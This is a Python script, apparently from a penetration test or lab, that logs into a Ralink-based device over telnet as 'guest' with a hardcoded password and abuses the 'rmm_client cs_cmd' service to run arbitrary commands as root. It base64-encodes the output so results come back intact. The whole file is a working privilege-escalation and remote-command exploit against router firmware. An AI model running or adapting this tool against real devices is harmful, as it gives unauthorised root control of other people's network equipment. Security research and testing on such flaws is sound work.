#!/usr/bin/env python3
# Reliable Ralink root command runner: logs in as guest, runs CMD as root via
# rmm_client cs_cmd, base64-encodes the output so telnet binary framing can't mangle it.
import sys, pexpect, base64, re
HOST="192.168.157.185"; GUESTPW="1qaz@WSX"
cmd = sys.argv[1] if len(sys.argv)>1 else "id"
# wrap: run command as root, base64 its combined output on one line
inner = "( %s ) 2>&1 | base64 | tr -d '\\n'" % cmd
rmm = 'rmm_client %s cs_cmd "%s"' % (HOST, inner.replace('"','\\"'))
c = pexpect.spawn("telnet %s"%HOST, timeout=30, encoding="latin-1")
if c.expect(["login:", pexpect.TIMEOUT, pexpect.EOF])!=0: sys.exit("no login prompt")
c.sendline("guest"); c.expect("assword:"); c.sendline(GUESTPW)
if c.expect([r"\$ ", r"# ", pexpect.TIMEOUT])==2: sys.exit("no shell prompt")
S="B64START"; E="B64END"
c.sendline("echo %s; %s; echo %s" % (S, rmm, E))
c.expect(S, timeout=30)          # eat the echoed command line's first marker
c.expect(S, timeout=30)          # real start marker (printed)
c.expect(E, timeout=40)
blob = c.before
c.sendline("exit")
# extract base64 (strip cs_cmd wrapper noise, keep only base64 chars)
b64 = "".join(re.findall(r"[A-Za-z0-9+/=]+", blob))
# base64 may have wrapper words like 'CMD','Len','respond' etc concatenated; try progressive decode
best=""
for cut in range(0, len(b64)):
    try:
        d=base64.b64decode(b64[cut:]+"="*((4-len(b64[cut:])%4)%4), validate=False)
        t=d.decode("latin-1")
        printable=sum(ch.isprintable() or ch in "\n\t" for ch in t)
        if len(t)>len(best) and printable>0.8*len(t):
            best=t
    except Exception:
        pass
print(best if best else "(no decodable output)\nRAW:"+blob[:400])
